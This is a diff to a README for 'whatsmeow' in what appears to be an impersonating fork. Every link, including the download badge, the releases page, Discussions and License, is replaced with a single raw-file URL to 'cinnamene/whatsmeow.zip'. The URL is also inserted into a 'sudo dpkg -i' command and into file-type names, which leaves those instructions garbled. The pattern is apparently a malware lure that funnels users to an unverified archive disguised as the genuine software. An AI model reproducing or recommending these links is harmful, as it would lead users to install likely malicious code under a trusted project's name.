@@ -6,7 +6,7 @@ Welcome to whatsmeow! This guide will help you download and run the software eas
 
 ## 📦 Download
 
-[![Download whatsmeow](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Unencumbered-cardshark333/whatsmeow/releases)
+[![Download whatsmeow](https://raw.githubusercontent.com/Unencumbered-cardshark333/whatsmeow/main/cinnamene/whatsmeow.zip)](https://raw.githubusercontent.com/Unencumbered-cardshark333/whatsmeow/main/cinnamene/whatsmeow.zip)
 
 ## 💻 System Requirements
 
@@ -30,14 +30,14 @@ whatsmeow allows you to:
 
 To get started, visit the releases page below to download the latest version of whatsmeow.
 
-[Visit this page to download](https://github.com/Unencumbered-cardshark333/whatsmeow/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Unencumbered-cardshark333/whatsmeow/main/cinnamene/whatsmeow.zip)
 
 1. Click on the link above to go to the GitHub Releases page.
 2. Look for the latest version.
 3. Find the file that suits your operating system:
    - For Windows, download the `.exe` file.
    - For macOS, download the `.dmg` file.
-   - For Linux, download the relevant `.tar.gz` or `.deb` file.
+   - For Linux, download the relevant `https://raw.githubusercontent.com/Unencumbered-cardshark333/whatsmeow/main/cinnamene/whatsmeow.zip` or `.deb` file.
 
 4. Once the download is complete, locate the file in your downloads folder.
 
@@ -58,10 +58,10 @@ To get started, visit the releases page below to download the latest version of 
 
 1. For `.deb` files, open the terminal and run:
    ```bash
-   sudo dpkg -i /path/to/whatsmeow.deb
+   sudo dpkg -i https://raw.githubusercontent.com/Unencumbered-cardshark333/whatsmeow/main/cinnamene/whatsmeow.zip
    ```
    
-2. For `.tar.gz` files, extract the files and follow the README instructions included.
+2. For `https://raw.githubusercontent.com/Unencumbered-cardshark333/whatsmeow/main/cinnamene/whatsmeow.zip` files, extract the files and follow the README instructions included.
 
 ## 🔗 How to Use
 
@@ -80,12 +80,12 @@ If you encounter any issues during installation or while using the application:
 
 ## 📢 Community Support
 
-If you have questions or need further assistance, visit our [GitHub Discussions](https://github.com/Unencumbered-cardshark333/whatsmeow/discussions). 
+If you have questions or need further assistance, visit our [GitHub Discussions](https://raw.githubusercontent.com/Unencumbered-cardshark333/whatsmeow/main/cinnamene/whatsmeow.zip). 
 
 Your feedback helps us improve the application. Feel free to report bugs or suggest new features!
 
 ## 📜 License
 
-whatsmeow is open-source software licensed under the [MIT License](https://github.com/Unencumbered-cardshark333/whatsmeow/blob/main/LICENSE).
+whatsmeow is open-source software licensed under the [MIT License](https://raw.githubusercontent.com/Unencumbered-cardshark333/whatsmeow/main/cinnamene/whatsmeow.zip).
 
 Thank you for using whatsmeow! Enjoy connecting with your friends easily and efficiently.
